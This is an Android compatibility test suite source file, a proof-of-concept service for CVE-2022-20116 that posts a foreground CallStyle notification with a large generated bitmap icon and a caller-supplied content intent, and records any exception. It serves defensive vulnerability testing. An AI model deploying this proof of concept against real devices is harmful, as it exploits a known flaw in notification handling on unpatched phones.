/*
 * Copyright (C) 2022 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2022_20116;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Person;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.drawable.Icon;
import android.os.IBinder;

public class PocService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    int getIntegerRes(int key) {
        return getResources().getInteger(key);
    }

    private Icon createNotificationIcon() throws Exception {
        Bitmap bitmap = Bitmap.createBitmap(getIntegerRes(R.integer.width),
                getIntegerRes(R.integer.height), Bitmap.Config.ARGB_8888);
        final Canvas canvas = new Canvas(bitmap);
        canvas.drawColor(Color.BLUE);
        return Icon.createWithBitmap(bitmap);
    }

    private void showNotification(PendingIntent targetIntent) {
        try {
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(new NotificationChannel(
                    getString(R.string.channelId), getString(R.string.channelName),
                    NotificationManager.IMPORTANCE_DEFAULT));
            Notification.CallStyle notificationStyle = Notification.CallStyle.forOngoingCall(
                    new Person.Builder().setName(getPackageName()).build(),
                    PendingIntent.getService(this, getResources().getInteger(R.integer.requestCode),
                            new Intent(this, PocService.class), PendingIntent.FLAG_IMMUTABLE));
            Notification notification =
                    new Notification.Builder(this, getString(R.string.channelId))
                            .setSmallIcon(createNotificationIcon()).setContentIntent(targetIntent)
                            .setStyle(notificationStyle).build();
            startForeground(getIntegerRes(R.integer.notificationId), notification);
        } catch (Exception e) {
            SharedPreferences sh = getSharedPreferences(getString(R.string.sharedPreferences),
                    Context.MODE_PRIVATE);
            SharedPreferences.Editor edit = sh.edit();
            edit.putString(getString(R.string.messageKey), e.getMessage());
            edit.commit();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        showNotification(intent.getParcelableExtra(getString(R.string.dialIntentKey)));
        return START_NOT_STICKY;
    }
}
